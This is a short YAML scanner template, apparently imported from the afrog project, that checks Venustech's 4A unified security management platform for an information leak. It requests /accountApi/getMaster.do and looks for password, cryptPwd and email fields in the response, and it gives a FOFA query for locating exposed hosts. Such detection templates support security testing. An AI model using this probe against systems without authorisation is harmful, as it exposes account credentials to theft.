# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - cnname
          - password
          - cryptPwd
          - authtype
          - email
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/accountApi/getMaster.do'
id: venustech-4a-gtmaster-disclosure
info:
  author: zan8in
  description: |
    FOFA: "4A 统一安全管控平台"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 启明星辰-4A 统一安全管控平台 getMater 信息泄漏
  severity: high
  tags: venustech,disclosure,argus-import
